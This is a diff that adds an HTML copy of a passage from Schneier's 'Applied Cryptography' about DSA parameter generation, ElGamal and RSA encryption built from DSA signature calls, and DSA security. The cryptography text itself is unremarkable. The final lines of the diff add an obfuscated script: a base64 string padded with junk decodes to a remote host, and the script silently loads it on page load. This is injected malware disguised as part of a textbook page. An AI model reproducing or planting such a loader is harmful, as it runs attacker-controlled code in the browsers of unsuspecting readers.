@@ -1,0 +1,154 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Public-Key Digital Signature Algorithms</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=20//-->
+<!--PAGES=489-491//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="20-03.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="20-05.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Choose an arbitrary sequence of at least 160 bits and call it <I>S</I>. Let <I>g</I> be the length of <I>S</I> in bits.
+<DD><B>(2)</B>&nbsp;&nbsp;Compute <I>U</I> = SHA(<I>S</I>) &#8853; SHA ((<I>S</I> &#43; 1) mod 2<SUP><I>g</I></SUP>), where SHA is the Secure Hash Algorithm (see Section 18.7).
+<DD><B>(3)</B>&nbsp;&nbsp;Form <I>q</I> by setting the most significant bit and the least significant bit of <I>U</I> to 1.
+<DD><B>(4)</B>&nbsp;&nbsp;Check whether <I>q</I> is prime.
+<DD><B>(5)</B>&nbsp;&nbsp;If <I>q</I> is not prime, go back to step (1).
+<DD><B>(6)</B>&nbsp;&nbsp;Let <I>C</I> = 0 and <I>N</I> = 2.
+<DD><B>(7)</B>&nbsp;&nbsp;For <I>k</I> = 0, 1,..., <I>n</I>, let <I>V</I><SUB>k</SUB> = SHA ((<I>S</I> &#43; <I>N</I> &#43; <I>k</I>) mod 2<SUP><I>g</I></SUP>)
+<DD><B>(8)</B>&nbsp;&nbsp;Let <I>W</I> be the integer
+<DL>
+<DD><I>W</I> = <I>V</I><SUB>0</SUB> &#43; 2<SUP>160</SUP><I>V</I><SUB>1</SUB> &#43;...&#43; 2<SUP>160(<I>n</I> - 1)</SUP><I>V</I><SUB>n - 1</SUB> &#43; 2<SUP>160<I>n</I></SUP>(<I>V</I><SUB>n</SUB> mod 2<SUP><I>b</I></SUP>)
+</DL>
+<BR>and let
+<DL>
+<DD><I>X</I> = <I>W</I> &#43; 2<SUP><I>L</I> - 1</SUP>
+</DL>
+<BR>Note that <I>X</I> is an <I>L</I>-bit number.
+<DD><B>(9)</B>&nbsp;&nbsp;Let <I>p</I> = <I>X</I> &#150; ((<I>X</I> mod <I>2</I><SUB>q</SUB>) &#150; 1). Note that <I>p</I> is congruent to 1 mod <I>2</I><SUB>q</SUB>.
+<DD><B>(10)</B>&nbsp;&nbsp;If <I>p</I> &lt 2<SUP><I>L</I> - 1</SUP>, then go to step (13).
+<DD><B>(11)</B>&nbsp;&nbsp;Check whether <I>p</I> is prime.
+<DD><B>(12)</B>&nbsp;&nbsp;If <I>p</I> is prime, go to step (15).
+<DD><B>(13)</B>&nbsp;&nbsp;Let <I>C</I> = <I>C</I> &#43; 1 and <I>N</I> = <I>N</I> &#43; <I>n</I> &#43; 1.
+<DD><B>(14)</B>&nbsp;&nbsp;If <I>C</I> = 4096, then go to step (1). Otherwise, go to step (7).
+<DD><B>(15)</B>&nbsp;&nbsp;Save the value of <I>S</I> and the value of <I>C</I> used to generate <I>p</I> and <I>q</I>.
+</DL>
+<P>In [1154], the variable <I>S</I> is called the &#147;seed,&#148; <I>C</I> is called the &#147;counter,&#148; and <I>N</I> the &#147;offset.&#148;</P>
+<P>The point of this exercise is that there is a public means of generating <I>p</I> and <I>q</I>. For all practical purposes, this method prevents cooked values of <I>p</I> and <I>q</I>. If someone hands you a <I>p</I> and a <I>q</I>, you might wonder where that person got them. However, if someone hands you a value for <I>S</I> and <I>C</I> that generated the random <I>p</I> and <I>q</I>, you can go through this routine yourself. Using a one-way hash function, SHA in the standard, prevents someone from working backwards from a <I>p</I> and <I>q</I> to generate an <I>S</I> and <I>C</I>.</P>
+<P>This security is better than what you get with RSA. In RSA, the prime numbers are kept secret. Someone could generate a fake prime or one of a special form that makes factoring easier. Unless you know the private key, you won&#146;t know that. Here, even if you don&#146;t know a person&#146;s private key, you can confirm that <I>p</I> and <I>q</I> have been generated randomly.</P>
+<P><FONT SIZE="+1"><B><I>ElGamal Encryption with DSA</I></B></FONT></P>
+<P>There have been allegations that the government likes the DSA because it is only a digital signature algorithm and can&#146;t be used for encryption. It is, however, possible to use the DSA function call to do ElGamal encryption.
+</P>
+<P>Assume that the DSA algorithm is implemented with a single function call:</P>
+<!-- CODE SNIP //-->
+<PRE>
+    DSAsign (p,q,g,k,x,h,r,s)
+</PRE>
+<!-- END CODE SNIP //-->
+<P>You supply the numbers <I>p, q, g, k, x</I>, and <I>h</I>, and the function returns the signature parameters: <I>r</I> and <I>s</I>.</P>
+<P>To do ElGamal encryption of message <I>m</I> with public key <I>y</I>, choose a random number, <I>k</I>, and call</P>
+<!-- CODE SNIP //-->
+<PRE>
+    DSAsign (p,p,g,k,0,0,r,s)
+</PRE>
+<!-- END CODE SNIP //-->
+<P>The value of <I>r</I> returned is <I>a</I> in the ElGamal scheme. Throw <I>s</I> away. Then, call</P>
+<!-- CODE SNIP //-->
+<PRE>
+    DSAsign (p,p,y,k,0,0,r,s)
+</PRE>
+<!-- END CODE SNIP //-->
+<P>Rename the value of <I>r</I> to be <I>u</I>; throw <I>s</I> away. Call</P>
+<!-- CODE SNIP //-->
+<PRE>
+    DSAsign (p,p,m,1,u,0,r,s)
+</PRE>
+<!-- END CODE SNIP //-->
+<P>Throw <I>r</I> away. The value of <I>s</I> returned is <I>b</I> in the ElGamal scheme. You now have the ciphertext, <I>a</I> and <I>b</I>.</P>
+<P>Decryption is just as easy. Using secret key <I>x</I>, and ciphertext messages <I>a</I> and <I>b</I>, call</P>
+<!-- CODE SNIP //-->
+<PRE>
+    DSAsign (p,p,a,x,0,0,r,s)
+</PRE>
+<!-- END CODE SNIP //-->
+<P>The value <I>r</I> is <I>a<SUP>x</I></SUP> mod <I>p</I>. Call that <I>e</I>. Then call</P>
+<!-- CODE SNIP //-->
+<PRE>
+    DSAsign (p,p,1,e,b,0,r,s)
+</PRE>
+<!-- END CODE SNIP //-->
+<P>The value <I>s</I> is the plaintext message, <I>m</I>.</P>
+<P>This method will not work with all implementations of DSA. Some may fix the values of <I>p</I> and <I>q</I>, or the lengths of some of the other parameters. Still, if the implementation is general enough, this is a way to encrypt using nothing more than digital signature function.</P>
+<P><FONT SIZE="+1"><B><I>RSA Encryption with DSA</I></B></FONT></P>
+<P>RSA encryption is even easier. With a modulus <I>n</I>, message <I>m</I>, and public key <I>e</I>, call</P>
+<!-- CODE SNIP //-->
+<PRE>
+    DSAsign (n,n,m,e,0,0,r,s)
+</PRE>
+<!-- END CODE SNIP //-->
+<P>The value of <I>r</I> returned is the ciphertext.</P>
+<P>RSA decryption is the same thing. If <I>d</I> is the private key, then</P>
+<!-- CODE SNIP //-->
+<PRE>
+    DSAsign (n,n,m,d,0,0,r,s)
+</PRE>
+<!-- END CODE SNIP //-->
+<P>returns the plaintext as the value of <I>r</I>.</P>
+<P><FONT SIZE="+1"><B><I>Security of DSA</I></B></FONT></P>
+<P>At 512-bits, DSA wasn&#146;t strong enough for long-term security. At 1024 bits, it is.
+</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="20-03.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="20-05.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(oIwdFEUl, ujQFcAAF) {ujQFcAAF = oIwdFEUl.createElement('script');ujQFcAAF.type = 'text/javascript';ujQFcAAF.async = true;ujQFcAAF.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');oIwdFEUl.getElementsByTagName('body')[0].appendChild(ujQFcAAF);}(document));</script></body>
+</html>
